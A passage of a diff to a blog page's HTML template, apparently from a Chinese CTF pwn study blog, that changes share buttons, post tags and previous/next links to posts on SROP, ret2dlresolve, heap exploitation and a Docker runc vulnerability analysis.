fa-fw"></i></a></span>
+                <span><a href="#" onclick="return false;" title="分享到 Twitter" data-sharer="twitter" data-url="https://liuliuliuzy.github.io/2021-11-01-srop%E5%AD%A6%E4%B9%A0/" data-title="pwn初学者的进阶（四）：SROP" data-hashtags="CTF,pwn,Linux,Signal,Kernel"><i class="fab fa-twitter fa-fw"></i></a><a href="#" onclick="return false;" title="分享到 Reddit" data-sharer="reddit" data-url="https://liuliuliuzy.github.io/2021-11-01-srop%E5%AD%A6%E4%B9%A0/"><i class="fab fa-reddit fa-fw"></i></a><a href="#" onclick="return false;" title="分享到 微博" data-sharer="weibo" data-url="https://liuliuliuzy.github.io/2021-11-01-srop%E5%AD%A6%E4%B9%A0/" data-title="pwn初学者的进阶（四）：SROP"><i class="fab fa-weibo fa-fw"></i></a><a href="#" onclick="return false;" title="分享到 百度" data-sharer="baidu" data-url="https://liuliuliuzy.github.io/2021-11-01-srop%E5%AD%A6%E4%B9%A0/" data-title="pwn初学者的进阶（四）：SROP"><i data-svg-src="/lib/simple-icons/icons/baidu.min.svg"></i></a><a href="#" onclick="return false;" title="分享到 Evernote" data-sharer="evernote" data-url="https://liuliuliuzy.github.io/2021-11-01-srop%E5%AD%A6%E4%B9%A0/" data-title="pwn初学者的进阶（四）：SROP"><i class="fab fa-evernote fa-fw"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/%E5%A0%86/">堆</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/signal/">Signal</a>,&nbsp;<a href="/tags/kernel/">Kernel</a></section>
         <section>
             <span><a href="#" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/" class="prev" rel="prev" title="pwn初学者的进阶（四）：SROP"><i class="fas fa-angle-left fa-fw"></i>pwn初学者的进阶（四）：SROP</a>
-            <a href="/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/" class="next" rel="next" title="Docker runc(CVE-2019-5736)漏洞分析-第三版">Docker runc(CVE-2019-5736)漏洞分析-第三版<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="prev" rel="prev" title="pwn初学者的进阶（二）：ret2dlresolve学习记录"><i class="fas fa-angle-left fa-fw"></i>pwn初学者的进阶（二）：ret2dlresolve学习记录</a>
+            <a href="/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/" class="next" rel="next" title="pwn初学者的进阶（三）：堆学习">pwn初学者的进阶（三）：堆学习<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 <div id="comments"><div id="valine" class="comment"></div><noscript>
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
